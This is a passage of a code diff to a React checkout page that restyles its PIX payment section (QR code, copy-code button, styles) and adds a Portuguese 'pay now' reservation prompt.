+                    <div style={{ marginBottom: '10px', color: '#ef4444', fontWeight: 'bold', fontSize: '14px' }}>
+                      Pague agora para garantir sua reserva!
+                    </div>
                     <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
-                      <div style={{ padding: '8px', background: '#fff', borderRadius: '12px', border: '2px dashed #1da154', display: 'inline-block' }}>
-                        {pixData.qrImage ? (
-                          <img
-                            src={pixData.qrImage}
-                            alt="QR Code PIX"
-                            style={{ width: '200px', height: '200px', display: 'block', borderRadius: '6px' }}
-                          />
-                        ) : (
-                          <QrCode size={200} color="#1da154" />
-                        )}
+                      <div style={{ padding: '12px', background: '#fff', borderRadius: '16px', border: '3px solid #1da154', boxShadow: '0 4px 12px rgba(0,0,0,0.1)' }}>
+                        <img src={pixData.qrImage} alt="QR Code PIX" style={{ width: '220px', height: '220px' }} />
                       </div>
                     </div>
-
-                    {/* Código copia-e-cola */}
-                    <div style={pixCodeBox}>
+                    <div style={{ ...pixCodeBox, wordBreak: 'break-all', fontSize: '12px', padding: '12px', background: '#f8f9fa', borderRadius: '8px', marginBottom: '10px', border: '1px solid #ddd' }}>
                       {pixData.qrCode}
                     </div>
-
-                    {/* Botão copiar */}
-                    <button
-                      type="button"
-                      onClick={copiarPix}
-                      style={{ ...btnPagar, background: copiado ? '#1da154' : '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}
+                    <button 
+                      type="button" 
+                      onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} 
+                      style={{ ...btnPagar, background: copiado ? '#1da154' : '#000', marginBottom: '10px' }}
                     >
-                      {copiado ? <><CheckCheck size={18} /> COPIADO!</> : <><Copy size={18} /> COPIAR CÓDIGO PIX</>}
+                      {copiado ? '✅ CÓDIGO COPIADO!' : 'COPIAR CÓDIGO PIX'}
                     </button>
-
-                    <p style={{ fontSize: '11px', color: '#666', marginTop: '10px', textAlign: 'center' }}>
-                      Abra seu banco, escaneie o QR ou cole o código para pagar
-                    </p>
-                  </>
-                )}
-
-                {/* Botão finalizar no modo PIX (salva no Supabase) */}
-                {!pixLoading && (
-                  <button type="submit" style={{ ...btnPagar, background: '#555', marginTop: '8px' }}>
-                    JÁ REALIZEI O PAGAMENTO
-                  </button>
+                    <p style={{ fontSize: '12px', color: '#666' }}>Após o pagamento, o seu pedido será processado automaticamente.</p>
+                  </div>
                 )}
               </div>
             )}
@@ -517,12 +574,10 @@ export default function Checkout() {
   );
 }
 
-// ESTILOS
-const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
+const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', pointerEvents: 'auto' };
 const spinnerStyle = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
-const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite' };
-const productBox = { display: 'flex', gap: '15px', padding: '15px', background: '#f8f9fa', borderRadius: '12px', border: '1px solid #ddd', marginBottom: '20px' };
-const imgStyle = { width: '100px', height: '100px', borderRadius: '12px', objectFit: 'cover' as 'cover', border: '1px solid #eee' };
+const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite', margin: '0 auto' };
+const productBox = { display: 'flex', gap: '15px', padding: '20px', background: '#f8f9fa', borderRadius: '12px', border: '2px solid #000', marginBottom: '20px' };
 const tabContainer = { display: 'flex', gap: '8px', marginBottom: '20px', background: '#f1f5f9', padding: '5px', borderRadius: '12px' };
 const tabActive = { flex: 1, padding: '12px', border: 'none', borderRadius: '8px', background: '#fff', fontWeight: '900', color: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', cursor: 'pointer' };
 const tabInactive = { flex: 1, padding: '12px', border: 'none', background: 'transparent', color: '#666', fontWeight: '900', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
@@ -532,5 +587,5 @@ const inputStyle = { border: 'none', padding: '14px 0', marginLeft: '10px', widt
 const cardSection = { marginTop: '25px', padding: '20px', background: '#f8f9fa', borderRadius: '15px', border: '2px solid #000' };
 const errorBanner = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center' as 'center', border: '1px solid #ef4444' };
 const btnPagar = { width: '100%', padding: '20px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '12px', fontWeight: '900', fontSize: '16px', marginTop: '10px', cursor: 'pointer' };
-const pixSection = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px', border: '2px dashed #1da154' };
+const pixSection = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px' };
 const pixCodeBox = { marginTop: '12px', marginBottom: '4px', fontSize: '10px', background: '#fff', padding: '10px', borderRadius: '8px', border: '1px solid #ddd', wordBreak: 'break-all' as 'break-all', fontWeight: 'bold', textAlign: 'left' as 'left', maxHeight: '60px', overflowY: 'auto' as 'auto' };
